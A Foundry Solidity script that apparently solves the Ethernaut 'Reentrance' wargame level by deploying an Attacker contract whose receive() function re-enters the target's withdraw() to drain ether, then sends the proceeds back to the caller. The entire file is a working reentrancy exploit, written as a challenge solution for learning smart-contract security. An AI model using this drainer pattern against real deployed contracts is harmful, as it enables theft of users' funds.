// SPDX-License-Identifier: MIT

pragma solidity ^0.6.12;

import {Reentrance} from "../src/level10.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

/// @notice reentrancy attack
contract Level10Solution is Script {
    Reentrance public level = Reentrance(payable(0xf208849063dA4cBd0dD10FbA73E4552Fc71Cc106));

 
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("beforebalance: ", address(vm.envAddress("MY_ADDRESS")).balance);
        //Deploy a new attacker contract and send 0.001 ether so it can donate
        Attacker attack = new Attacker{value: 0.001 ether}(level);
        //Call the attack function which should perform 1 donate, then withdraw from the target contract
        attack.attack();
        console.log("atkbalance: ", address(attack).balance);
        //Withdraw the funds from attacker contract
        attack.withdraw();
        console.log("atkbalance: ", address(attack).balance);
        console.log("afterbalance: ", address(vm.envAddress("MY_ADDRESS")).balance);
        console.log("address:", address(vm.envAddress("MY_ADDRESS")));
        vm.stopBroadcast();
    }

}

contract Attacker {
    Reentrance level;
    uint _amount = 0.001 ether;

    constructor(Reentrance _level) public payable{
        level = _level;
    }

    function attack() external {
        level.donate{value: _amount}(address(this));
        level.withdraw(_amount);
    }

    function withdraw() external {
        (bool result,) = msg.sender.call{value: address(this).balance}("");
        require(result);
    }

    receive() external payable {
        //Whenever this attacker contract
        level.withdraw(_amount);
    }
}


